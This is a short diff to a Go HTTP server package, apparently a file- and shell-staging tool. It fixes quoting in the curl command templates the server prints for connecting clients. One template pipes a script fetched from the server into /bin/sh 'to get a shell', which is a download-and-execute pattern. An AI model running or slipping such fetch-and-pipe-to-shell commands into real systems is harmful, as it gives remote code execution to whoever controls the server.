@@ -6,7 +6,7 @@ package hsrv
  * HTTP server
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240327
+ * Last Modified 20240328
  */
 
 import (
@@ -35,11 +35,15 @@ const (
 
 	// CurlFormat prints the start of the curl command used to connect
 	// to us.
-	CurlFormat = `curl -sk --pinnedpubkey "sha256//%s" https://%s`
+	CurlFormat = `curl -sk --pinnedpubkey 'sha256//%s' 'https://%s`
+
+	// FileSuffix is added to CurlFormat when telling the user how to get
+	// a file.
+	FileSuffix = "'"
 
 	// ShellSuffix is added to CurlFormat when telling the user haw to get
 	// a shell.
-	ShellSuffix = "/c | /bin/sh"
+	ShellSuffix = "/c' | /bin/sh"
 )
 
 var (
@@ -141,7 +145,12 @@ func (s *Server) Do(ctx context.Context) error {
 		s.Logf(ScriptColor, "To get files from %s:", s.fdir)
 		s.Logf(ScriptColor, "\n")
 		for _, a := range as {
-			s.Logf(ScriptColor, CurlFormat, s.l.Fingerprint, a)
+			s.Logf(
+				ScriptColor,
+				CurlFormat+FileSuffix,
+				s.l.Fingerprint,
+				a,
+			)
 		}
 		s.Logf(ScriptColor, "\n")
 	}
